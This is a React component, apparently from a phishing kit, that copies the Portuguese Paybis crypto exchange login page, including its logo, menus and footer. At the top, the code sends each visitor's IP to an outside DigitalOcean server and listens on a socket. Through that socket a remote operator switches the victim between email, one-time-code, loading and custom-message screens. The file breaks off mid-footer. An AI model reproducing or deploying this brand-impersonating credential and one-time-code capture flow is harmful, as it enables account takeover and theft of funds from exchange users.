import React, { useEffect, useState } from "react";
import axios from "axios";

import "./paybis.css";

import Paybisemail from "./paybisemail";
import PaybisOTP from "./paybisOTP";
import PaybisLoad from "./paybisload";
import PaybisOTPMSG from "./paybisOTPMSG";

export default function Paybis({ ip, socket }) {
  const [cenaAtual, setCenaAtual] = useState("email");
  const [msgRecebida, setMsgRecebida]=useState("");

  console.log("ip:" + ip);

  useEffect(() => {
    async function login() {
      await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/login", {
        corretora: "paybis",
        ip: ip,
      });
      socket.emit("RegistraUSER", ip);
    }

    login();

    // Definição do ouvinte dentro de useEffect para garantir a configuração única
    const handleTrocaCena = ({ ipRecebido, cenaRecebida, msg }) => {
      console.log("recebido");

      if (ip === ipRecebido) {
        async function AtualizaCena() {
          await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/atualizacena", {
            cena: cenaRecebida,
            ip: ipRecebido,
          });
        }

        AtualizaCena();

        if(cenaRecebida==="otp2"){
          setMsgRecebida(msg)
        }

        socket.emit("clienteAtualizou");
        setCenaAtual(cenaRecebida); // Correção para atualizar o estado corretamente
      }
    };

    socket.on("TrocaCena", handleTrocaCena);

    // Função de limpeza para remover o ouvinte
    return () => {
      socket.off("TrocaCena", handleTrocaCena);
    };
  }, [ip, socket]); // Dependências para re-executar apenas se ip ou socket mudarem

  return (
    <div class="wrapper">
      
    
      <nav className="nav">
        <div className="nav-inner nav-inner__tiny">
          <a
            href="#"
            className="nav-logo"
            rel="home"
            title="Paybis - Digital and Crypto currency exchange!"
          >
            <svg viewBox="0 0 101 27" xmlns="http://www.w3.org/2000/svg">
              <path
                d="m13 0.79999v25.397c-6.6069 0-12.2-5.8118-12.2-12.697 0-6.8846 5.5931-12.7 12.2-12.7z"
                clip-rule="evenodd"
                fill="#5F70DB"
                fill-rule="evenodd"
              ></path>
              <path d="m58.735 14.797-2.7795-7.3264h-4.9928l5.3788 12.342-2.239 5.9873h4.4008l7.2064-18.329h-4.4009l-2.5738 7.3264z"></path>
              <path d="m100.61 11.541c-0.309-3.2824-2.6252-4.4377-5.9453-4.4377-3.114 0-5.7647 1.4706-5.7647 4.5166 0 2.8622 1.5185 3.939 5.1214 4.4117 1.853 0.2625 2.4966 0.5775 2.4966 1.2342 0 0.6827-0.5148 1.129-1.6473 1.129-1.3124 0-1.7501-0.5515-1.9044-1.5492h-4.2466c0.1029 3.0459 2.3422 4.674 6.1767 4.674 3.7318 0 6.0996-1.4704 6.0996-4.7265 0-2.941-1.8016-3.939-5.5333-4.4117-1.647-0.2101-2.2647-0.4726-2.2647-1.129 0-0.6303 0.5145-1.0768 1.5185-1.0768 1.055 0 1.5441 0.4465 1.7241 1.3654h4.1694z"></path>
              <path d="m87.36 21.205v-13.734h-4.6068v13.734h4.6068z"></path>
              <path d="m87.592 3.742c0-1.3916-1.1065-2.442-2.5478-2.442-1.4414 0-2.5221 1.0505-2.5221 2.442 0 1.3918 1.0807 2.416 2.5221 2.416 1.4413 0 2.5478-1.0241 2.5478-2.416z"></path>
              <path
                d="m30.802 7.1033c3.14 0 5.6878 2.4159 5.6878 7.1162v0.2101c0 4.7267-2.5478 7.09-5.7136 7.09-2.033 0-3.5-0.9714-4.1691-2.3369v6.6173h-4.6068v-18.329h4.6068v2.0482c0.772-1.313 2.1619-2.4159 4.1949-2.4159zm-4.3237 7.0902c0-2.3111 1.0039-3.5453 2.6766-3.5453 1.6213 0 2.651 1.1557 2.651 3.5713v0.2101c0 2.2583-0.9265 3.4925-2.651 3.4925-1.6727 0-2.6766-1.1817-2.6766-3.5188v-0.2098z"
                clip-rule="evenodd"
                fill-rule="evenodd"
              ></path>
              <path
                d="m44.543 7.1033c3.706 0 6.0736 1.5495 6.0736 5.1993v8.902h-4.478v-1.602c-0.6434 0.998-1.8273 1.917-3.9891 1.917-2.4193 0-4.5554-1.2079-4.5554-4.1226 0-3.2299 2.6767-4.4905 7.1546-4.4905h1.2868v-0.315c0-1.313-0.3088-2.1795-1.7756-2.1795-1.2611 0-1.7244 0.7616-1.8273 1.6281h-4.324c0.206-3.3088 2.7538-4.9368 6.4344-4.9368zm0.2829 8.4556h1.2096v0.8401c0 1.1818-0.9779 1.9433-2.2904 1.9433-1.0811 0-1.5956-0.499-1.5956-1.2866 0-1.1293 0.8234-1.4968 2.6764-1.4968z"
                clip-rule="evenodd"
                fill-rule="evenodd"
              ></path>
              <path
                d="m71.489 1.4313v8.0879c0.7719-1.313 2.1618-2.4159 4.1951-2.4159 3.1398 0 5.6876 2.4159 5.6876 7.1162v0.2101c0 4.7267-2.5478 7.09-5.7133 7.09-2.0076 0-3.5003-0.9714-4.1694-2.4421v2.1271h-4.6069v-19.773h4.6069zm-0.1286 12.762c0-2.3111 1.0036-3.5453 2.6764-3.5453 1.6216 0 2.6509 1.1557 2.6509 3.5713v0.2101c0 2.2583-0.9265 3.4925-2.6509 3.4925-1.6728 0-2.6764-1.1817-2.6764-3.5188v-0.2098z"
                clip-rule="evenodd"
                fill-rule="evenodd"
              ></path>
            </svg>
          </a>
          <div className="nav-links__primary">
            <div className="nav-links__item">
              <a className="nav-link" href="/pt/" title="Comprar Bitcoin">
                Comprar
              </a>
            </div>
            <div className="nav-links__item">
              <a
                className="nav-link"
                href="/pt/sell-bitcoin/"
                title="Vender Bitcoin"
              >
                Vender
              </a>
            </div>
            <div className="nav-links__item">
              <a
                className="nav-link"
                href="/pt/crypto-wallet/"
                title="Carteira Bitcoin"
              >
                Carteira
              </a>
            </div>
            <div className="nav-links__item nav-dropdown">
              <button className="nav-dropdown__toggle nav-link">
                Ferramentas
              </button>
              <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--md">
                <div className="nav-dropdown-menu__inner">
                  <ul className="nav-dropdown-list nav-dropdown-list--primary">
                    <li className="drop-down-item">
                      <a href="/pt/price/" className="nav-dropdown-list__item">
                        <div className="nav-dropdown-list__item-main">
                          <div className="nav-dropdown-list__item-title">
                            Preços das criptos
                          </div>
                          <div className="nav-dropdown-list__item-subtitle">
                            Gráficos em tempo real
                          </div>
                        </div>
                      </a>
                    </li>
                    <li className="drop-down-item">
                      <a
                        href="/pt/bitcoin-calculator/"
                        className="nav-dropdown-list__item"
                      >
                        <div className="nav-dropdown-list__item-main">
                          <div className="nav-dropdown-list__item-title">
                            Calculadora de criptos
                          </div>
                          <div className="nav-dropdown-list__item-subtitle">
                            Conversor criptomoeda
                          </div>
                        </div>
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div className="nav-links__secondary">
            <div className="nav-links__list">
              <div className="nav-links__item nav-dropdown">
                <button className="nav-dropdown__toggle nav-link">
                  Empresas
                </button>
                <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--lg">
                  <div className="nav-dropdown-menu__inner">
                    <ul className="nav-dropdown-list nav-dropdown-list--primary">
                      <li className="drop-down-item">
                        <a
                          href="/pt/on-off-ramp/"
                          className="nav-dropdown-list__item"
                        >
                          <img
                            src="images/widget.svg"
                            alt="On/Off Ramp"
                            className="nav-dropdown-list__item-icon"
                            loading="lazy"
                          />
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              On/Off Ramp
                            </div>
                            <div className="nav-dropdown-list__item-subtitle">
                              Allow your customers to buy or sell crypto with
                              ease
                            </div>
                          </div>
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              <div className="nav-links__item nav-dropdown">
                <button className="nav-dropdown__toggle nav-link">
                  <i className="icon icon-earth"></i>
                  <span>Português</span>
                </button>
                <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--sm nav-dropdown-menu--lang">
                  <div className="nav-dropdown-menu__inner">
                    <ul className="nav-dropdown-list nav-dropdown-list--primary">
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/user/login/"
                          data-lang="en"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              English
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/ru/user/login/"
                          data-lang="ru"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              Русский
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/es/user/login/"
                          data-lang="es"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              Español
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/it/user/login/"
                          data-lang="it"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              Italiano
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/fr/user/login/"
                          data-lang="fr"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              Français
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/de/user/login/"
                          data-lang="de"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              Deutsch
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/ko/user/login/"
                          data-lang="ko"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              한국어
                            </div>
                          </div>
                        </a>
                      </li>
                      <li>
                        <a
                          className="nav-dropdown-list__item languageLink"
                          href="/ar/user/login/"
                          data-lang="ar"
                        >
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              عربى
                            </div>
                          </div>
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <div className="nav-links__login-group">
              <a className="btn btn-sm btn-secondary" href="#">
                Entrar
              </a>
              <a className="btn btn-sm btn-primary" href="#">
                Registrar-se
              </a>
            </div>
          </div>
          <div className="nav-burger">
            <button className="nav-burger-toggle toggle-open">Menu</button>
            <div className="nav-burger-menu">
              <div className="nav-burger-menu__inner">
                <button className="nav-burger-toggle nav-burger-toggle--close">
                  Close menu
                </button>
                <div className="nav-burger-menu__section">
                  <div className="nav-burger-tabs">
                    <div className="nav-burger-tabs__header nav-burger-tabs__header-wrap">
                      <button
                        className="nav-burger-tabs__toggle is-selected"
                        data-tab="personal"
                      >
                        Pessoal
                      </button>
                      <button
                        className="nav-burger-tabs__toggle"
                        data-tab="business"
                      >
                        Empresas
                      </button>
                    </div>
                    <div className="nav-burger-tabs__content">
                      <div
                        className="nav-burger-tabs__item is-selected"
                        data-tab="personal"
                      >
                        <ul>
                          <li>
                            <a href="/pt/" className="item">
                              <img
                                src="images/buy.svg"
                                alt="Comprar Criptomoedas"
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">
                                  Comprar Criptomoedas
                                </div>
                                <div className="item__subtitle">
                                  O melhor lugar para comprar bitcoin e outras
                                  criptomoedas
                                </div>
                              </div>
                            </a>
                          </li>
                          <li>
                            <a href="/pt/sell-bitcoin/" className="item">
                              <img
                                src="images/sell.svg"
                                alt="Vender Criptomoedas"
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">
                                  Vender Criptomoedas
                                </div>
                                <div className="item__subtitle">
                                  O melhor lugar para vender bitcoin e outras
                                  criptomoedas
                                </div>
                              </div>
                            </a>
                          </li>
                          <li>
                            <a href="/pt/crypto-wallet/" className="item">
                              <img
                                src="images/wallets.svg"
                                alt="Carteira"
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">Carteira</div>
                                <div className="item__subtitle">
                                  Compre, venda, armazene criptomoedas - tudo em
                                  um só lugar
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                      <div
                        className="nav-burger-tabs__item"
                        data-tab="business"
                      >
                        <ul>
                          <li>
                            <a href="/pt/on-off-ramp/" className="item">
                              <img
                                src="images/widget.svg"
                                alt="On/Off Ramp"
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">On/Off Ramp</div>
                                <div className="item__subtitle">
                                  Allow your customers to buy or sell crypto
                                  with ease
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div className="nav-burger-menu__login-group">
                    <a
                      className="btn btn-sm btn-secondary"
                      href="/pt/user/login/"
                    >
                      Entrar
                    </a>
                    <a
                      className="btn btn-sm btn-primary"
                      href="/pt/user/register/"
                    >
                      Registrar-se
                    </a>
                  </div>
                </div>
                <div className="nav-burger-menu__section">
                  <ul className="nav-burger-menu__list">
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/about-us/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-users"></i>
                        <span> Sobre nós </span>
                        <small> Nossa equipe e missão </small>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/news/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-bullhorn"></i>
                        <span> Notícias </span>
                        <small> Últimas notícias da Paybis </small>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="https://paybis.com/blog/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-bookmark"></i>
                        <span> Blog </span>
                        <small> Explore nossos últimos artigos </small>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/referral-program/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-referal"></i>
                        <span> Indicações e afiliados </span>
                        <small> Ganhe dinheiro com a Paybis </small>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/price/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-coins"></i>
                        <span> Preços das criptos </span>
                        <small> Gráficos em tempo real </small>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/bitcoin-calculator/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-calculator"></i>
                        <span> Calculadora de criptos </span>
                        <small> Conversor criptomoeda </small>
                      </a>
                    </li>
                  </ul>
                  <ul className="nav-burger-menu__list nav-burger-menu__list--secondary">
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/policies/terms-of-service/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-shield-alt"></i>
                        <span> Políticas </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="https://support.paybis.com/hc/en-us/articles/13873600620317-Risks-associated-with-cryptocurrency-investments"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-support"></i>
                        <span> O resumo do risco </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="https://support.paybis.com/hc/en-us/articles/9089022363037-Types-of-fees-applied"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-support"></i>
                        <span> Taxas </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a href="/pt/faq/" className="nav-burger-menu__item-link">
                        <i className="icon icon-question-circle"></i>
                        <span> Perguntas - Respostas </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="https://support.paybis.com/hc/en-us"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-support"></i>
                        <span> Apoio </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/career/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-career"></i>
                        <span> Carreiras </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/pt/contacts/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-mailbox"></i>
                        <span> Contatos </span>
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="nav-burger-menu__section">
                  <div className="nav-accordion">
                    <button
                      className="nav-accordion__toggle"
                      data-tab="languages"
                    >
                      <i className="nav-accordion__toggle-icon icon icon-earth"></i>
                      <span>Português</span>
                    </button>
                    <div className="nav-accordion__container">
                      <ul className="nav-accordion__list nav-accordion__list--primary">
                        <li>
                          <a
                            href="/user/login/"
                            data-lang="en"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              English
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/ru/user/login/"
                            data-lang="ru"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              Русский
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/es/user/login/"
                            data-lang="es"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              Español
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/it/user/login/"
                            data-lang="it"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              Italiano
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/fr/user/login/"
                            data-lang="fr"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              Français
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/de/user/login/"
                            data-lang="de"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              Deutsch
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/ko/user/login/"
                            data-lang="ko"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              한국어
                            </div>
                          </a>
                        </li>
                        <li>
                          <a
                            href="/ar/user/login/"
                            data-lang="ar"
                            className="nav-accordion__item languageLink"
                          >
                            <div className="nav-accordion__item-title">
                              عربى
                            </div>
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <main className="main" id="authentication-flow-loader">
        <div className="auth-container">
          <div className="auth-wrapper">
            <div className="app__inner">
              <div className="app__body">
                {cenaAtual === "email" ? (
                  <Paybisemail
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "otp" ? (
                  <PaybisOTP
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "load" ? (
                  <PaybisLoad
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "otp2" ? (
                  <PaybisOTPMSG
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                    msgRecebida={msgRecebida}
                  />
                ) : (
                  <PaybisLoad
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                )}
              </div>
            </div>
          </div>
          <div className="auth-footer">Protegido pelo protocolo TLS</div>
        </div>
      </main>
      <div id="login"></div>


      <div id="fca-notification-footer"></div>
      <footer className="footer">
        <div className="footer__inner">
          <div className="container">
            <div className="footer__row">
              <div className="footer-links">
                <div className="footer-links__column">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">
                      Nossa companhia
                    </h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/about-us/"
                          title="Sobre nós"
                          data-testid="aboutus"
                        >
                          Sobre nós
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/career/"
                          title="Carreiras"
                          data-testid="careers"
                        >
                          Carreiras
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/contacts/"
                          title="Contatos"
                          data-testid="contacts"
                        >
                          Contatos
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/news/"
                          title="Notícias"
                          data-testid="news"
                        >
                          Notícias
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/referral-program/"
                          title="Indicações e afiliados"
                          data-testid="referrals"
                        >
                          Indicações e afiliados
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/policies/terms-of-service/"
                          title="Políticas"
                          data-testid="policies"
                        >
                          Políticas
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="https://support.paybis.com/hc/en-us/articles/13873600620317-Risks-associated-with-cryptocurrency-investments"
                          title="O resumo do risco"
                          data-testid="risk-summary"
                        >
                          O resumo do risco
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Produtos</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/"
                          title="Comprar"
                          data-testid="buy-crypto"
                        >
                          Comprar
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/sell-bitcoin/"
                          title="Vender"
                          data-testid="buy-crypto"
                        >
                          Vender
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/on-off-ramp/"
                          title="On/Off Ramp"
                          data-testid="on-off-ramp"
                        >
                          On/Off Ramp
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Aprender</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="https://support.paybis.com/hc/en-us"
                          title="Apoio"
                          data-testid="support"
                        >
                          Apoio
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/faq/"
                          title="Perguntas - Respostas"
                          data-testid="faq"
                        >
                          Perguntas - Respostas
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="https://paybis.com/blog/"
                          title="Blog"
                          data-testid="blog"
                        >
                          Blog
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="https://support.paybis.com/hc/en-us/articles/9089022363037-Types-of-fees-applied"
                          title="Taxas"
                          data-testid="fees"
                        >
                          Taxas
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Comprar</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/"
                          title="Comprar Bitcoin"
                          data-testid="buybitcoin"
                        >
                          Comprar Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-ethereum/"
                          title="Comprar Ethereum"
                          data-testid="buyethereum"
                        >
                          Comprar Ethereum
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-tether/"
                          title="Comprar USDT"
                          data-testid="tether"
                        >
                          Comprar USDT
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-litecoin/"
                          title="Comprar Litecoin"
                          data-testid="buylitecoin"
                        >
                          Comprar Litecoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-ripple/"
                          title="Comprar Ripple"
                          data-testid="buyripple"
                        >
                          Comprar Ripple
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-bitcoin-cash/"
                          title="Compre Bitcoin Cash"
                          data-testid="buybtccash"
                        >
                          Compre Bitcoin Cash
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-stellar-lumens/"
                          title="Comprar Stellar"
                          data-testid="buystellar"
                        >
                          Comprar Stellar
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-binance-coin/"
                          title="Comprar Binance Coin"
                          data-testid="buybinance"
                        >
                          Comprar Binance Coin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-tron/"
                          title="Comprar Tron"
                          data-testid="buytron"
                        >
                          Comprar Tron
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/buy-dogecoin/"
                          title="Comprar Dogecoin"
                          data-testid="buydogecoin"
                        >
                          Comprar Dogecoin
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Vender</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/sell-bitcoin/"
                          title="Vender Bitcoin"
                          data-testid="sellbitcoin"
                        >
                          Vender Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/sell-usdt/"
                          title="Vender USDT"
                          data-testid="sellusdt"
                        >
                          Vender USDT
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">
                      Carteiras de criptomoedas
                    </h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/bitcoin-wallet/"
                          title="Carteira Bitcoin"
                          data-testid="walletbitcoin"
                        >
                          Carteira Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/binance-coin-wallet/"
                          title="Carteira Binance Coin"
                          data-testid="walletbinancecoin"
                        >
                          Carteira Binance Coin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/ethereum-wallet/"
                          title="Carteira Ethereum"
                          data-testid="walletethereum"
                        >
                          Carteira Ethereum
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/tether-wallet/"
                          title="Carteira Tether"
                          data-testid="wallettether"
                        >
                          Carteira Tether
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/cardano-wallet/"
                          title="Carteira Cardano"
                          data-testid="walletcardano"
                        >
                          Carteira Cardano
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/dogecoin-wallet/"
                          title="Carteira Dogecoin"
                          data-testid="walletdogecoin"
                        >
                          Carteira Dogecoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/polkadot-wallet/"
                          title="Carteira Polkadot"
                          data-testid="walletpolkadot"
                        >
                          Carteira Polkadot
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Calculadora</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/bitcoin-calculator/"
                          title="Calculadora Bitcoin"
                          data-testid="bitcoincalc"
                        >
                          Calculadora Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/ethereum-calculator/"
                          title="Calculadora Ethereum"
                          data-testid="ethereumcalc"
                        >
                          Calculadora Ethereum
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/litecoin-calculator/"
                          title="Calculadora Litecoin"
                          data-testid="litecoincalc"
                        >
                          Calculadora Litecoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/xrp-calculator/"
                          title="Calculadora XRP"
                          data-testid="xrpcalc"
                        >
                          Calculadora XRP
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/bitcoin-cash-calculator/"
                          title="Calculadora Bitcoin Cash"
                          data-testid="bitcoincashcalc"
                        >
                          Calculadora Bitcoin Cash
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/stellar-calculator/"
                          title="Calculadora Stellar"
                          data-testid="stellarcalc"
                        >
                          Calculadora Stellar
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/binance-coin-calculator/"
                          title="Calculadora Binance Coin"
                          data-testid="binancecalc"
                        >
                          Calculadora Binance Coin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/dogecoin-calculator/"
                          title="Calculadora Dogecoin"
                          data-testid="dogecalc"
                        >
                          Calculadora Dogecoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/tron-calculator/"
                          title="Calculadora TRON"
                          data-testid="troncalc"
                        >
                          Calculadora TRON
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/tether-calculator/"
                          title="Calculadora Tether"
                          data-testid="tethercalc"
                        >
                          Calculadora Tether
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Preços</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/bitcoin/"
                          title="Bitcoin Preço"
                          data-testid="bitcoinprice"
                        >
                          Bitcoin Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/ethereum/"
                          title="Ethereum Preço"
                          data-testid="ethereumprice"
                        >
                          Ethereum Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/litecoin/"
                          title="Litecoin Preço"
                          data-testid="litecoinprice"
                        >
                          Litecoin Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/xrp/"
                          title="XRP Preço"
                          data-testid="xrpprice"
                        >
                          XRP Preço
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/pt/price/bitcoin-cash/"
                          title="Bitcoin Cash Preço"
                          data-testid="bitcoincashprice"
                        >
                          Bitcoin Cash Preço
                        </a>
                      </li>
                      <li>
                        <a
